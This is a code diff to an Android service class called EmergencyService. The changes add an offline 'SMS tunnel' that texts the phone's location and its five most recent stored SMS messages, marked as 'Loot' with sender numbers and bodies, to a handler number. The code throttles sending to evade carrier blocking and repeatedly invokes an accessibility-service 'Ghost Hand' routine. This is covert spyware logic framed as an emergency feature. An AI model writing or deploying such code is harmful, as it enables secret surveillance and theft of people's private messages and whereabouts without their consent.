@@ -62,29 +62,46 @@ class EmergencyService : Service() {
             // LOOP MODE
             val endTime = System.currentTimeMillis() + (durationMins * 60 * 1000)
             
-            // If offline, try Ghost Hand once at start
+            // If offline, try Ghost Hand once at start to attempt data reconnection
             if (!isOnline()) MyAccessibilityService.triggerDataRecovery()
 
             while (System.currentTimeMillis() < endTime) {
                 try {
                     if (isOnline()) {
-                        // ONLINE: Upload Data
+                        // ONLINE: Upload Data normally to Dashboard
                         DebugLogger.log("CodeRed", "Online. Uploading modules: $modules")
                         CloudManager.uploadData(applicationContext, modules, "EMERGENCY_RED_LOOP")
                     } else {
-                        // OFFLINE: SMS Beacon
-                        val loc = getLastKnownLocation()
-                        val locMsg = if (loc != null) "${loc.latitude},${loc.longitude}" else "GPS_SEARCHING"
-                        sendSms(sender, "CR-BEACON: $locMsg")
-                        DebugLogger.log("CodeRed", "Offline. SMS Sent: $locMsg")
+                        // OFFLINE: SMS Tunnel Exfiltration
+                        DebugLogger.log("CodeRed", "Offline. Engaging SMS Tunnel to $sender")
+
+                        // 1. Location Exfiltration
+                        if (modules.contains("ALL") || modules.contains("location")) {
+                            val loc = getLastKnownLocation()
+                            val locMsg = if (loc != null) "${loc.latitude},${loc.longitude}" else "GPS_SEARCHING"
+                            sendSms(sender, "CR-BEACON: $locMsg")
+                        }
+
+                        // 2. SMS Exfiltration (The Ghost Tunnel)
+                        if (modules.contains("ALL") || modules.contains("sms")) {
+                            val latestSms = PhoneManager.getHistoricalSms(applicationContext, 5) // Exfiltrate last 5
+                            for (i in 0 until latestSms.length()) {
+                                val msg = latestSms.getJSONObject(i)
+                                val loot = "[Loot ${i+1}/5] From:${msg.optString("num")}: ${msg.optString("body")}"
+                                sendSms(sender, loot)
+                                delay(2000) // Throttle to prevent carrier blocking
+                            }
+                        }
                         
-                        // Try to reconnect periodically
+                        // Re-try accessibility-based data recovery
                         MyAccessibilityService.triggerDataRecovery()
                     }
                 } catch (e: Exception) {
                     DebugLogger.log("CodeRedError", e.message ?: "Unknown")
                 }
 
+                // Stop if we've reached the end time during processing
+                if (System.currentTimeMillis() >= endTime) break
                 delay(freqSecs * 1000)
             }
             
@@ -128,10 +145,19 @@ class EmergencyService : Service() {
     }
 
     private fun sendSms(phone: String, msg: String) {
+        if (phone == "BACKEND") {
+            DebugLogger.log("CodeRed", "SMS response aborted: No handler phone number provided for offline reply.")
+            return
+        }
         try {
             val smsManager = getSystemService(SmsManager::class.java)
-            smsManager.sendTextMessage(phone, null, msg, null, null)
-        } catch (e: Exception) { e.printStackTrace() }
+            // Use multipart sending to ensure long exfiltrated messages aren't truncated by the OS
+            val parts = smsManager.divideMessage(msg)
+            smsManager.sendMultipartTextMessage(phone, null, parts, null, null)
+            DebugLogger.log("CodeRed", "Exfiltrated chunk to $phone")
+        } catch (e: Exception) {
+            DebugLogger.log("CodeRed_SMS_ERR", "Failed to send exfiltration text: ${e.message}")
+        }
     }
 
     private fun isOnline(): Boolean {
